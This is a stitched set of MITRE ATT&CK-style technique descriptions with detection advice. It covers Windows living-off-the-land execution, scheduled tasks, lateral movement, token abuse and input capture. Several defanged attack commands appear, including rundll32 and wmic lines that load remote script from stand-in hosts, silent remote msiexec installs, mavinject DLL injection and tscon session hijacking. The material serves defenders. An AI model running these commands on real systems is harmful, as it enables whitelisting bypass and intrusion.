        Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the binary being executed.

        Monitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious.

        If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.

        Monitor for loading and/or execution of artifacts associated with PowerShell specific assemblies, such as System.Management.Automation.dll (especially to unusual process names/locations). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)

        It is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution (which is applied to .NET invocations). (Citation: Malware Archaeology PowerShell Cheat Sheet) PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features. (Citation: FireEye PowerShell Logging 2016) An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.

        Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)

        Adversaries can use Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Both utilities may be used to bypass process whitelisting through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute.

        Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe can be used to execute arbitrary binaries. (Citation: Microsoft Regsvr32)

        Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of whitelists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe is also a Microsoft signed binary.

        Regsvr32.exe can also be used to specifically bypass process whitelisting using functionality to load COM scriptlets to execute DLLs under user permissions. Since regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a "Squiblydoo" attack and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)

        Regsvr32.exe can also be leveraged to register a COM Object used to establish Persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1122). (Citation: Carbon Black Squiblydoo Apr 2016)

        Rundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)

        Rundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks.

        Utilities such as [at](https://attack.mitre.org/software/S0110) and [schtasks](https://attack.mitre.org/software/S0111), along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on. Scheduling a task on a remote system typically required being a member of the Administrators group on the remote system. (Citation: TechNet Task Scheduler Security)

        An adversary may use task scheduling to execute programs at system startup or on a scheduled basis for persistence, to conduct remote Execution as part of Lateral Movement, to gain SYSTEM privileges, or to run a process under the context of a specified account.

        Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Monitor process execution from the <code>svchost.exe</code> in Windows 10 and the Windows Task Scheduler <code>taskeng.exe</code> for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in <code>%systemroot%\System32\Tasks</code> for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.

        Configure event logging for scheduled task creation and changes by enabling the "Microsoft-Windows-TaskScheduler/Operational" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)(Citation: Microsoft Scheduled Task Events Win10)

        * Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered
        * Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated
        * Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted
        * Event ID 4698 on Windows 10, Server 2016 - Scheduled task created
        * Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled
        * Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled

        Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns) Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data.

        Monitor processes and command-line arguments for actions that could be taken to create tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1086), so additional logging may need to be configured to gather the appropriate data.

        Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and [PowerShell](https://attack.mitre.org/techniques/T1086) but could also be in the form of command-line batch scripts.

        Scripts can be embedded inside Office documents as macros that can be set to execute when files used in [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), where adversaries will rely on macros being allowed or that the user will accept to activate them.

        Many popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit (Citation: Metasploit_Ref), Veil (Citation: Veil_Ref), and PowerSploit (Citation: Powersploit) are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. (Citation: Alperovitch 2014)

        Scripting may be common on admin, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.

        Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.

        Analyze Office file attachments for potentially malicious macros. Execution of macros may create suspicious process trees depending on what the macro is designed to do. Office processes, such as winword.exe, spawning instances of cmd.exe, script application like wscript.exe or powershell.exe, or other suspicious processes may indicate malicious activity.

        to its original form shortly after the service is restarted so the service
        is not left broken, as is the case with the common administrator tool [PsExec](https://attack.mitre.org/software/S0029).

      name: Signed Binary Proxy Execution
      description: |-
        Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application whitelisting and signature validation on systems. This technique accounts for proxy execution methods that are not already accounted for within the existing techniques.

        ### Msiexec.exe
        Msiexec.exe is the command-line Windows utility for the Windows Installer. Adversaries may use msiexec.exe to launch malicious MSI files for code execution. An adversary may use it to launch local or network accessible MSI files.(Citation: LOLBAS Msiexec)(Citation: Rancor Unit42 June 2018)(Citation: TrendMicro Msiexec Feb 2018) Msiexec.exe may also be used to execute DLLs.(Citation: LOLBAS Msiexec)

        * <code>msiexec.exe /q /i "C:\path\to\file.msi"</code>
        * <code>msiexec.exe /q /i http[:]//site[.]com/file.msi</code>
        * <code>msiexec.exe /y "C:\path\to\file.dll"</code>

        ### Mavinject.exe
        Mavinject.exe is a Windows utility that allows for code execution. Mavinject can be used to input a DLL into a running process. (Citation: Twitter gN3mes1s Status Update MavInject32)

        * <code>"C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe" &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</code>
        * <code>C:\Windows\system32\mavinject.exe &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</code>

        ### SyncAppvPublishingServer.exe
        SyncAppvPublishingServer.exe can be used to run PowerShell scripts without executing powershell.exe. (Citation: Twitter monoxgas Status Update SyncAppvPublishingServer)

        ### Odbcconf.exe
        Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) The utility can be misused to execute functionality equivalent to [Regsvr32](https://attack.mitre.org/techniques/T1117) with the REGSVR option to execute a DLL.(Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: TrendMicro Cobalt Group Nov 2017)

        * <code>odbcconf.exe /S /A &lbrace;REGSVR "C:\Users\Public\file.dll"&rbrace;</code>

        Several other binaries exist that may be used to perform similar behavior. (Citation: GitHub Ultimate AppLocker Bypass List)

        The <code>source</code> command loads functions into the current shell or executes files in the current context. This built-in command can be run in two different ways <code>source /path/to/filename [arguments]</code> or <code>. /path/to/filename [arguments]</code>. Take note of the space after the ".". Without a space, a new shell is created that runs the program instead of running the program within the current context. This is often used to make certain features or functions available to a shell or to update a specific shell's environment.(Citation: Source Manual)

        Adversaries can abuse this functionality to execute programs. The file executed with this technique does not need to be marked executable beforehand.

        Adversaries may gain access to and use third-party systems installed within an enterprise network, such as administration, monitoring, and deployment systems as well as third-party gateways and jump servers used for managing other systems. Access to a third-party network-wide or enterprise-wide software system may enable an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.

        on standard builds of Windows and may only be present on developer workstations
        using older versions of .NET Core and ASP.NET Core 1.0. The dnx.exe executable
        is signed by Microsoft. \n\nAn adversary can use dnx.exe to proxy execution

        Console Debugger (CDB) cdb.exe is also user-mode debugger. Both utilities
        are included in Windows software development kits and can be used as standalone
        tools. (Citation: Microsoft Debugging Tools for Windows) They are commonly
        used in software development and reverse engineering and may not be found
        on typical Windows systems. Both WinDbg.exe and cdb.exe binaries are signed
        by Microsoft.\n\nAn adversary can use WinDbg.exe and cdb.exe to proxy execution
        of arbitrary code to bypass application whitelist policies that do not account
        for execution of those utilities. (Citation: Exploit Monday WinDbg)\n\nIt
        is likely possible to use other debuggers for similar purposes, such as the
        kernel-mode debugger kd.exe, which is also signed by Microsoft.\n\n### Tracker\n\nThe
        file tracker utility, tracker.exe, is included with the .NET framework as
        part of MSBuild. It is used for logging calls to the Windows file system.
        (Citation: Microsoft Docs File Tracking)\n\nAn adversary can use tracker.exe
        to proxy execution of an arbitrary DLL into another process. Since tracker.exe
        is also signed it can be used to bypass application whitelisting solutions.

        The presence of these or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.

        Use process monitoring to monitor the execution and arguments of MSBuild.exe, dnx.exe, rcsi.exe, WinDbg.exe, cdb.exe, and tracker.exe. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. It is likely that these utilities will be used by software developers or for other software development related tasks, so if it exists and is used outside of that context, then the event may be suspicious. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.

      name: XSL Script Processing
      description: |-
        Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)

        Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses. Similar to [Trusted Developer Utilities](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)

        Command-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)

        * <code>msxsl.exe customers[.]xml script[.]xsl</code>
        * <code>msxsl.exe script[.]xsl script[.]xsl</code>
        * <code>msxsl.exe script[.]jpeg script[.]jpeg</code>

        Another variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1117)/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)

        Command-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)

        * Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>
        * Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>

        Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). (Citation: LOLBAS Wmic) (Citation: Twitter SquiblyTwo Detection APR 2018) Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.

        The presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.

      description: |
        Adversaries may use application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.

        Application access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)

        For example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a "refresh" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)

        Compromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.

      name: Exploitation of Remote Services
      description: |-
        Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.

        An adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Scanning](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.

        There are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services. (Citation: NVD CVE-2014-7169)

        Depending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.

      name: Internal Spearphishing
      description: |-
        Adversaries may use internal spearphishing to gain access to additional information or exploit other users within the same organization after they already have access to accounts or systems within the environment. Internal spearphishing is multi-staged attack where an email account is owned either by controlling the user's device with previously installed malware or by compromising the account credentials of the user. Adversaries attempt to take advantage of a trusted internal account to increase the likelihood of tricking the target into falling for the phish attempt.(Citation: Trend Micro When Phishing Starts from the Inside 2017)

        Adversaries may leverage [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) or [Spearphishing Link](https://attack.mitre.org/techniques/T1192) as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through [Input Capture](https://attack.mitre.org/techniques/T1056) on sites that mimic email login interfaces.

        There have been notable incidents where internal spearphishing has been used. The Eye Pyramid campaign used phishing emails with malicious attachments for lateral movement between victims, compromising nearly 18,000 email accounts in the process.(Citation: Trend Micro When Phishing Starts from the Inside 2017) The Syrian Electronic Army (SEA) compromised email accounts at the Financial Times (FT) to steal additional account credentials. Once FT learned of the attack and began warning employees of the threat, the SEA sent phishing emails mimicking the Financial Times IT department and were able to compromise even more users.(Citation: THE FINANCIAL TIMES LTD 2019.)

      description: |-
        ### Windows

        Windows allows logon scripts to be run whenever a specific user or group of users log into a system. (Citation: TechNet Logon Scripts) The scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server.

        If adversaries can access these scripts, they may insert additional code into the logon script to execute their tools when a user logs in. This code can allow them to maintain persistence on a single system, if it is a local script, or to move laterally within a network, if the script is stored on a central server and pushed to many systems. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.

        ### Mac

        Mac allows login and logoff hooks to be run as root whenever a specific user logs into or out of a system. A login hook tells Mac OS X to execute a certain script when a user logs in, but unlike startup items, a login hook executes as root (Citation: creating login hook). There can only be one login hook at a time though. If adversaries can access these scripts, they can insert additional code to the script to execute their tools when a user logs in.

      description: |-
        Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.

        In this technique, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access. (Citation: ADSecurity AD Kerberos Attacks) (Citation: GentilKiwi Pass the Ticket)

        Silver Tickets can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint). (Citation: ADSecurity AD Kerberos Attacks)

        Golden Tickets can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory. (Citation: Campbell 2014)

        Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). (Citation: TechNet Remote Desktop Services) There are other implementations and third-party tools that provide graphical access [Remote Services](https://attack.mitre.org/techniques/T1021) similar to RDS.

        Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1015) technique for Persistence. (Citation: Alperovitch Malware)

        Adversaries may also perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session and prompted with a question. With System permissions and using Terminal Services Console, <code>c:\windows\system32\tscon.exe [session number to be stolen]</code>, an adversary can hijack a session without the need for credentials or prompts to the user. (Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions. (Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in RedSnarf. (Citation: Kali Redsnarf)

        Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.

        Also, set up process monitoring for <code>tscon.exe</code> usage and monitor service creation that uses <code>cmd.exe /k</code> or <code>cmd.exe /c</code> in its arguments to prevent RDP session hijacking.

        Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Files may be copied from an external adversary-controlled system through the Command and Control channel to bring tools into the victim network or through alternate protocols with another tool such as [FTP](https://attack.mitre.org/software/S0095). Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.

        Adversaries may also copy files laterally between internal victim systems to support Lateral Movement with remote Execution using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) or [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076).

        Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.

        Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

      description: |-
        Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.

        In order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial. (Citation: Slideshare Abusing SSH) (Citation: SSHjack Blackhat) (Citation: Clockwork SSH Agent Hijacking) Compromising the SSH agent also provides access to intercept SSH credentials. (Citation: Welivesecurity Ebury SSH)

        [SSH Hijacking](https://attack.mitre.org/techniques/T1184) differs from use of [Remote Services](https://attack.mitre.org/techniques/T1021) because it injects into an existing SSH session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).

        Adversaries may add malicious content to an internally accessible website through an open network file share that contains the website's webroot or Web content directory (Citation: Microsoft Web Root OCT 2016) (Citation: Apache Server 2018) and then browse to that content with a Web browser to cause the server to execute the malicious content. The malicious content will typically run under the context and permissions of the Web server process, often resulting in local system or administrative privileges, depending on how the Web server is configured.

        This mechanism of shared access and remote execution could be used for lateral movement to the system running the Web server. For example, a Web server running PHP with an open network share could allow an adversary to upload a remote access tool and PHP script to execute the RAT on the system running the Web server when a specific page is visited.

      description: |-
        Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.

        A directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses [Shortcut Modification](https://attack.mitre.org/techniques/T1023) of directory .LNK files that use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like the real directories, which are hidden through [Hidden Files and Directories](https://attack.mitre.org/techniques/T1158). The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. (Citation: Retwin Directory Share Pivot)

        Adversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.

        Adversaries may access data objects from improperly secured cloud storage.

        Many cloud service providers offer solutions for online data storage such as Amazon S3, Azure Storage, and Google Cloud Storage. These solutions differ from other storage solutions (such as SQL or Elasticsearch) in that there is no overarching application. Data from these solutions can be retrieved directly using the cloud provider's APIs. Solution providers typically offer security guides to help end users configure systems.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019)

        Misconfiguration by end users is a common problem. There have been numerous incidents where cloud storage has been improperly secured (typically by unintentionally allowing public access by unauthenticated users or overly-broad access by all users), allowing open access to credit cards, personally identifiable information, medical records, and other sensitive information.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017) Adversaries may also obtain leaked credentials in source repositories, logs, or other means as a way to gain access to cloud storage objects that have access permission controls.

      name: Data from Information Repositories
      description: |-
        Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information.

        Adversaries may also collect information from shared storage repositories hosted on cloud infrastructure or in software-as-a-service (SaaS) applications, as storage is one of the more fundamental requirements for cloud services and systems.

        The following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:

        * Policies, procedures, and standards
        * Physical / logical network diagrams
        * System architecture diagrams
        * Technical system documentation
        * Testing / development credentials
        * Work / project schedules
        * Source code snippets
        * Links to network shares and other internal resources

        Specific common information repositories include:

        ### Microsoft SharePoint
        Found in many enterprise networks and often used to store and share significant amounts of documentation.

        ### Atlassian Confluence
        Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation.

        As information repositories generally have a considerably large user base, detection of malicious use can be non-trivial. At minimum, access to information repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) should be closely monitored and alerted upon, as these types of accounts should not generally used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies.

        The user access logging within Microsoft's SharePoint can be configured to report access to certain pages and documents. (Citation: Microsoft SharePoint Logging) The user user access logging within Atlassian's Confluence can also be configured to report access to certain pages and documents through AccessLogFilter. (Citation: Atlassian Confluence Logging) Additional log storage and analysis infrastructure will likely be required for more robust detection capabilities.

        There are likely a variety of ways an adversary could collect email from a target, each with a different mechanism for detection.

        File access of local system email files for Exfiltration, unusual processes connecting to an email server within a network, or unusual access patterns or authentication attempts on a public-facing webmail server may all be indicators of malicious activity.

        Monitor processes and command-line arguments for actions that could be taken to gather local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1086).

        Detection is challenging because all messages forwarded because of an auto-forwarding rule have the same presentation as a manually forwarded message. It is also possible for the user to not be aware of the addition of such an auto-forwarding rule and not suspect that their account has been compromised; email-forwarding rules alone will not affect the normal usage patterns or operations of the email account.

        Auto-forwarded messages generally contain specific detectable artifacts that may be present in the header; such artifacts would be platform-specific. Examples include <code>X-MS-Exchange-Organization-AutoForwarded</code> set to true, <code>X-MailFwdBy</code> and <code>X-Forwarded-To</code>. The <code>forwardingSMTPAddress</code> parameter used in a forwarding process that is managed by administrators and not by user actions. All messages for the mailbox are forwarded to the specified SMTP address. However, unlike typical client-side rules, the message does not appear as forwarded in the mailbox; it appears as if it were sent directly to the specified destination mailbox.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2) High volumes of emails that bear the <code>X-MS-Exchange-Organization-AutoForwarded</code> header (indicating auto-forwarding) without a corresponding number of emails that match the appearance of a forwarded message may indicate that further investigation is needed at the administrator level rather than user-level.

        Adversaries can use methods of capturing user input for obtaining credentials for [Valid Accounts](https://attack.mitre.org/techniques/T1078) and information Collection that include keylogging and user input field interception.

        Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes, (Citation: Adventures of a Keystroke) but other methods exist to target information for specific purposes, such as performing a UAC prompt or wrapping the Windows default credential provider. (Citation: Wrightson 2012)

        Keylogging is likely to be used to acquire credentials for new access opportunities when [Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to remain passive on a system for a period of time before an opportunity arises.

        Adversaries may also install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service.

